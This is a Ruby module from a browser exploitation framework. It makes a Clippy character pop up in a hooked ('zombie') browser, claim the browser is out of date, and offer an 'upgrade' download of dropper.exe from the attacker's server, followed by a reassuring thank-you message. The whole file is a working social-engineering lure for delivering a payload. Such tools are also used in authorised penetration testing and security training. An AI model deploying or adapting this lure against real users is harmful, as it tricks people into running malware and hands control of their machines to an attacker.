#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#
class Clippy < Server::Core::Command
  def pre_send
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/clippy/assets/clippy-speech-bottom.png', '/clippy/clippy-speech-bottom', 'png')
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/clippy/assets/clippy-speech-mid.png', '/clippy/clippy-speech-mid', 'png')
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/clippy/assets/clippy-speech-top.png', '/clippy/clippy-speech-top', 'png')
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/clippy/assets/clippy-main.png', '/clippy/clippy-main', 'png')
  end

  def self.options
    @configuration = Server::Core::Configuration.instance
    proto = @configuration.server_proto
    server_host = @configuration.server_host
    server_port = @configuration.server_port
    base_host = "#{proto}://#{server_host}:#{server_port}"

    [
      { 'name' => 'clippydir', 'description' => 'Webdir containing clippy images', 'ui_label' => 'Clippy image directory', 'value' => "#{base_host}/clippy/" },
      { 'name' => 'askusertext', 'description' => 'Text for speech bubble', 'ui_label' => 'Custom text',
        'value' => 'Your browser appears to be out of date. Would you like to upgrade it?' },
      { 'name' => 'executeyes', 'description' => 'Executable to download', 'ui_label' => 'Executable', 'value' => "#{base_host}/dropper.exe" },
      { 'name' => 'respawntime', 'description' => '', 'ui_label' => 'Time until Clippy shows his face again', 'value' => '5000' },
      { 'name' => 'thankyoumessage', 'description' => 'Thankyou message after downloading', 'ui_label' => 'Thankyou message after downloading',
        'value' => 'Thanks for upgrading your browser! Look forward to a safer, faster web!' }
    ]
  end

  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    save({ 'answer' => @datastore['answer'] })
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/clippy/clippy-main.png')
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/clippy/clippy-speech-top.png')
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/clippy/clippy-speech-mid.png')
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/clippy/clippy-speech-bottom.png')
  end
end
